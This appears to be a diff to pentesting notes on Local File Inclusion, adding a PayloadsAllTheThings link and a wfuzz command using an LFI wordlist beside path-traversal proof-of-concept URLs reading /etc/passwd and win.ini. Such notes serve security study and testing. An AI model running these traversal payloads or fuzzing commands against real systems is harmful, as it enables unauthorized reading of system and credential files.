@@ -1,5 +1,7 @@
 # File Inclusion Vulnerabilities
 
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" %}
+
 ## Local File Inclusion (LFI)
 
 ### PoC
@@ -46,7 +48,11 @@ http://10.10.10.1/admin/?debug=../../../../../windows/win.ini
 http://10.10.10.1/admin/?debug=../../../../../etc/passwd
 ```
 
+Wfuzz:
 
+```
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh <common number> <URL>
+```
 
 
 
